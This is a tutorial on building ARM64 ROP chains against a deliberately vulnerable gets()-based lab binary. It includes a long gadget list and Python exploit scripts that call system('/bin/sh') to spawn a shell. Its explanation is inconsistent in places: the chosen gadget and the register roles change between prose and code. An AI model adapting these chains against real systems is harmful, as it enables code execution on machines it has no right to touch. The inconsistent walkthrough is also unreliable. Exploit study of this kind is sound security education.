# :game_die: Rop Chains On Arm64 6Ff10368798F

---

## Intro

Let’s start writing ROP chains for ARM64. if you are entirely new to rop chains please refer to this.

https://infosecwriteups.com/rop-chains-on-arm-3f087a95381e

This is similar to that of the ROP chains we did for ARM32. if you are comfortable with understanding ROP chains in the ARM32 This would be very easy for you. This is exactly similar. The only change is that we have new ARM64 assembly instructions.

So let’s start.

## Prerequisites

- ARM64 assembly

- Familiarity with buffer overflows

- Should have familiarity with ROP chains

- Lab setup

if you don’t have the above-mentioned prerequisites, you can follow chapters in my book or in the previous rop chain writeup.

## Intro to ARM64 ROP Chains

So let’s take the vulnerable binary from before (previous chapter) and compile it by removing the “-*z execstack*” flag.

```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void buf(){
char max[10];
gets(max);
}

int main()
{
char max[6];
printf("Overflow me daddy Uwu \n");
buf();
return 0;
}
```

`*gcc bof.c -fno-stack-protector -o bof*`

Also, make sure ASLR is off.

Let’s just execute the binary.

So the binary is running fine. So let’s find the gadgets using ropper.

For this, I copied the “libc” library from the emulated environment to the host using bashupload just like before.

## Finding the gadgets

Now, let’s fire up ropper and search for the gadgets.

Just like in the previous chapter we are trying to execute the system function with “/bin/sh” as the argument so that we get a shell.

So we need the exact gadgets that can help us.

We need to find the gadgets that load values from the stack and copy them to certain registers. For this, we can explore MOV, LDR, and LDP gadgets.

After searching for the time. I found some interesting gadgets. I will list them below.

```
0x000ea1d8: ldr x4, [x29, #0x58]; mov x3, x20; mov x2, x24; mov x1, x23; mov x0, x22; blr x4;
0x000bc5c8: ldr x0, [x29, #0x70]; blr x4;

0x00042090: mov x0, x1; ret;
0x00034534: mov x0, x2; ret;

0x000a2b78: mov x0, x20; blr x21;
0x00032ce8: mov x0, x20; blr x22;
0x0009d8e4: mov x0, x21; blr x1;
0x000dd674: mov x0, x21; blr x19;
0x0006d59c: mov x0, x20; blr x1;
0x000759a8: mov x0, x20; blr x2;
0x000a2b78: mov x0, x20; blr x21;
0x00032ce8: mov x0, x20; blr x22;
0x0009d8e4: mov x0, x21; blr x1;
0x000dd674: mov x0, x21; blr x19;
0x00073078: mov x0, x21; blr x2;
0x000dd568: mov x0, x21; blr x20;
0x00032cb8: mov x0, x21; blr x22;
0x00033090: mov x0, x21; blr x23;
0x000f0d44: mov x0, x21; blr x5;
0x00028580: mov x0, x22; blr x1;
0x000dcdf4: mov x0, x22; blr x2;
0x000c4a60: mov x0, x22; blr x23;
0x000ea0dc: mov x0, x22; blr x3;
0x000ea1e8: mov x0, x22; blr x4;
0x00098bc0: mov x0, x22; blr x5;
0x000d9c10: mov x0, x22; blr x6;
0x0006fc9c: mov x0, x23; blr x1;
0x00097a34: mov x0, x23; blr x19;
0x0007586c: mov x0, x23; blr x2;
0x000c4b28: mov x0, x23; blr x22;
0x000d7bc0: mov x0, x23; blr x6;
0x000d7814: mov x0, x23; blr x7;
0x0006d408: mov x0, x24; blr x1;
0x00097784: mov x0, x24; blr x22;
0x00044678: mov x0, x24; blr x3;
0x0004f43c: mov x0, x24; blr x6;
0x0004f384: mov x0, x24; blr x7;
0x000d7018: mov x0, x24; blr x8;
0x000641f8: mov x0, x26; blr x1;
0x0009e430: mov x0, x26; blr x2;
0x00032ccc: mov x0, x26; blr x22;
0x00021044: mov x0, x26; blr x3;

0x000f1ad0: mov x0, x27; blr x2;
0x000dd1f0: mov x0, x27; blr x21;
0x000e7110: mov x0, x27; blr x25;
0x00065760: mov x0, x28; blr x9;
0x0006e420: mov x0, x19; blr x1;
0x000ec94c: mov x0, x19; blr x2;
0x000dd568: mov x0, x21; blr x20;
0x000209d0: mov x0, x19; blr x20;
0x00020b14: mov x0, x19; blr x23;
0x0004c4cc: mov x0, x19; blr x3;
0x0002bc64: mov x0, x2; blr x1;
0x0002bd64: mov x0, x2; blr x3;
0x00034534: mov x0, x2; ret;

0x000b56d4: ldp x21, x30, [sp, #0x10]; ldp x19, x20, [sp], #0x20; ret;
0x000b61e0: ldp x23, x24, [sp, #0x20]; ldp x19, x20, [sp], #0x50; ret;

0x000a2b78: mov x0, x20; blr x21;
0x000b56d4: ldp x21, x30, [sp, #0x10]; ldp x19, x20, [sp], #0x20; ret;

0x00042090: mov x0, x1; ret;
0x00034534: mov x0, x2; ret;
0x0002fe30: mov x0, x3; ret;
0x000403dc: mov x0, x4; ret;
0x0004008c: mov x0, x5; ret;
0x0007f020: mov x0, x6; ret;
0x00040118: mov x0, x9; ret;

0x0009d5fc: mov x0, sp; blr x2;

0x000e59d8: ldr x5, [x29, #0x80]; ldp x0, x1, [x29, #0x90]; ldr x2, [x29, #0xa0]; blr x5;

0x00097a34: mov x0, x23; blr x19;
0x00027738: ldr x23, [sp, #0x30]; ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x29, x30, [sp], #0x40; ret;

```

From this, I looked for an LDP gadget that can load the addresses of the system function and the “/bin/sh” string.

Then I found a very suitable LDP gadget.

So the gadget is

`0x000b56d4: ldp x21, x30, [sp, #0x10]; ldp x19, x20, [sp], #0x20; ret;`

So we have already discussed what this instruction does. it will load two values from the stack to the corresponding registers.

In short, if we execute the first instruction

`ldp x21, x30, [sp, #0x10];`

x21 = [sp + 16]

x30 = [sp + 16 + 8]

sp remains unchanged

if we execute the second instruction

`ldp x19, x20, [sp], #0x20;`

x19 = [sp]

x20 = [sp + 8]

sp = sp + 0x20

And when ‘ret’ is encountered it will return its control back to the address at x30.

But we know according to the calling convention of ARM64, the arguments passed to a function are through registers x0 to x7.

So the first and only argument of our system function (address of the ‘/bin/sh’ string) should be loaded into r0.for that, I looked for ‘MOV’ instructions that can copy the values from the registers that we loaded using LDP instruction.

And after some digging, I found a useful gadget.

0x000dd568: mov x0, x21; blr x20;

As you can see here, there’s no ‘ret’ in this instruction. but still, we can use that because the blr instruction is branching to the x20 register which can be controlled using our first gadget.

Always try to make use of gadgets to their maximum capability rather than adding new gadgets. This will make our ROP chain easier and cleaner.

So let me talk you through the exploit plan.

## Arranging the gadgets

Firstly let’s get the address of the system function, libc library, and “/bin/sh” string.

Let’s load the binary into gdb, put a breakpoint at the main, and run the program.

When the breakpoint is hit. Obtain the system address using the ‘print’ or ‘’ disass’ command.

So the address of the system is 0x0000ffffb7ec9898.

Now use the vmmap command to get the base address of the libc library.

So libc address = 0x0000ffffb7e8c000

And finally, we need to get the address of the ‘/bin/sh’ string, we can use ‘grep’ for that.

`grep /bin/sh`

Address of /bin/sh = 0xffffb7fa2ac8

Now let’s think of the best way to place the addresses in our gadgets.

## Get Ajin Deepak (AD2001)’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

So in the first gadget

`ldp x21, x30, [sp, #0x10]; ldp x19, x20, [sp], #0x20; ret;`

x21 should contain the address of the “/bin/sh” string because it will be copied to r0 in the second gadget.

Similarly, x30 should be loaded with the address of the next gadget. So, when ‘ret’ is hit it will return its control back to the address in the x30.

mov x0, x21; blr x20;

And x20 should contain the address of the system because it’s the only way to call the system function in our gadgets. The ‘blr’ instruction will be used to call the system function. The return of the first gadget will be used to point to the second gadget.

In short,

x21 = address(system)

x20 = address(“/bin/sh”) will be moved to x0 (using the second gadget : mov x0,x21)

x30 = address(gadget_two)

Now let’s start writing our script.

`nano ropchain.py`

Firstly, let’s fill up our buffer to overflow the pc.

```
#!/usr/bin/python

import struct

junk = "A" * 24

```

Let’s now add the address of the system, the”/bin/sh” string, and libc using the struct module.

We have already seen how to use the struct module in the previous ROP chain chapter.

But in this case, it’s 64-bit so instead of “<L” we need to use “Q”.

```

import struct

junk = "A" * 24
libc = 0x0000ffffb7e8c000 #address of libc library
binsh = struct.pack("Q",0x0000ffffb7fa2ac8) #address of the /bin/sh string
system = struct.pack("Q",0x0000ffffb7ec9898) #address of system function
```

Let’s add our gadgets now.

```

#!/usr/bin/python

import struct

junk = "A" * 24
libc = 0x0000ffffb7e8c000 #address of libc library
binsh = struct.pack("Q",0x0000ffffb7fa2ac8) #address of the /bin/sh string
system = struct.pack("Q",0x0000ffffb7ec9898) #address of system function
gadget_one = struct.pack("Q",libc+0x000b56d4) #ldp x21, x30, [sp, #0x10]; ldp x19, x20, [sp], #0x20; ret;
gadget_two = struct.pack("Q",libc+0x000a2b78) #mov x0, x20; blr x21;
```

Now we have to add some junk characters because, in the first gadget, it’s loading values from [sp + 16] and [sp + 16 + 8].

So we need to check first So I printed out the junk and gadget_one to add that to our exploit.

```
!/usr/bin/python

import struct

junk = "A" * 24
libc = 0x0000ffffb7e8c000 #address of libc library
binsh = struct.pack("Q",0x0000ffffb7fa2ac8) #address of the /bin/sh string
system = struct.pack("Q",0x0000ffffb7ec9898) #address of system function
gadget_one = struct.pack("Q",libc+0x000b56d4) #ldp x21, x30, [sp, #0x10]; ldp x19, x20, [sp], #0x20; ret;
gadget_two = struct.pack("Q",libc+0x000a2b78) #mov x0, x20; blr x21;

print(junk + gadget_one)
```

Now I used gdbserver and gef to debug this.

I opened two tabs and ssh’ed into both tabs and created a remote session using gdbserver.

Tab one

Tab two

Now let’s debug this by putting a breakpoint at the ret instruction at the end of the main function.

```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ b *main + 32
Breakpoint 1 at 0x4006f8
gef➤
```

As we can see, we need to fill the stack with junk characters to control the region with our addresses so that it can be loaded into the registers.

Let’s find out how many characters we need to add to reach this region.

```
0x0000fffffffff4c0│+0x0010: 0x0000000000000000
0x0000fffffffff4c8│+0x0018: 0x0000000000000000
```

So the value in 0x0000fffffffff4c0 will be loaded into x21 and the value in 0x0000fffffffff4c8 will be loaded into x30.

Let’s use examine the stack using the command (x).

Let’s add 32 junk characters to fill these 4 blocks and add the address of the “/bin/sh” string and also add 8 junk characters to fill the register x30 for now.

In the end, we will replace the junk characters with the address of the gadget_two in x30.

```
#!/usr/bin/python

import struct

junk = "A" * 24
libc = 0x0000ffffb7e8c000 #address of libc library
binsh = struct.pack("Q",0x0000ffffb7fa2ac8) #address of the /bin/sh string
system = struct.pack("Q",0x0000ffffb7ec9898) #address of system function
gadget_one = struct.pack("Q",libc+0x000b56d4) #ldp x21, x30, [sp, #0x10]; ldp x19, x20, [sp], #0x20; ret;
gadget_two = struct.pack("Q",libc+0x000a2b78) #mov x0, x20; blr x21;
junk2 = "A" * 32
filler = "A" * 8

print(junk + gadget_one + junk2 + binsh + filler)
```

After executing the script and debugging using gdb

As we expected we filled x21 with the address of the “/bin/sh” string and x30 with 8 ‘A’ s.

As for the next instruction (*ldp x19, x20, [sp], #32*). it will load values from [sp] and [sp + 8] into x19 and x20.

So the values (8 A’s) from 0x0000fffffffff4b0 and 0x0000fffffffff4b8 will be loaded into x19 and x20.

0x0000fffffffff4b0 can be filled with junk because the x19 register is not useful to us.

0x0000fffffffff4b8 should be filled with the address of the string (is loaded into the x20 register).

So if we execute this, x19 and x20 will be filled with 8 ‘A’ s.

As expected, x19 and x20 are filled with “A”s.

Let’s find where 0x0000fffffffff4b0 and 0x0000fffffffff4b8 are in the stack using the examine command.

Now we found where 0x0000fffffffff4b0 and 0x0000fffffffff4b8 lie.

So let’s rewrite our exploit.

Don’t forget to add the address of the second gadget into x30.

```
#!/usr/bin/python
import struct
junk = "A" * 24
libc = 0x0000ffffb7e8c000 #address of libc library
binsh = struct.pack("Q",0x0000ffffb7fa2ac8) #address of the /bin/sh string
system = struct.pack("Q",0x0000ffffb7ec9898) #address of system function
gadget_one = struct.pack("Q",libc+0x000b56d4) #ldp x21, x30, [sp, #0x10]; ldp x$
gadget_two = struct.pack("Q",libc+0x000a2b78) #mov x0, x20; blr x21;
junk2 = "A" * 24
print(junk + gadget_one + junk2 + binsh + system + gadget_two)
```

Now let’s see the layout of our exploit in our stack.

Let’s run this in gdb with the help of gdbserver.

If you are confused about finding the offset of the registers from the stack memory you can use a pattern offset generator.

[https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html)

Let’s finally run our exploit outside gdb for the first time.

If everything is properly aligned we will get a shell.

`user@ubuntu1604-aarch64:~$ (python ropchain.py ; cat ) | ./bof`

So finally we got our beautiful shell using ROP chains.

Let me show you another rop chain that I made a while ago.

```
#!/bin/python
junk = "A" * 24
gadget = "\x38\x37\xeb\xb7\xff\xff\x00\x00" #FFFF B7EB 3738
junk2 = "A" * (56 - (24 + 8))
x19 = "AAAAAAAA"
x20 = "\xc8\x2a\xfa\xb7\xff\xff\x00\x00" #0xffffb7fa2ac8
x21 = "\x98\x98\xec\xb7\xff\xff\x00\x00" #system # 0x0000ffffb7ec9898)
x22 = "AAAAAAAA"
x30 = "\x78\xeb\xf2\xb7\xff\xff\x00\x00" # FFFF B7F2 EB78
gadget_2 = "\x90\x33\xf7\xb7\xff\xff\x00\x00" #FFFF B7F7 3390
#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
#print (pattern)
print( junk + gadget + junk2 + x30 + x19 + x20 + x21 + x22)
This is very messy but still works.
```

---
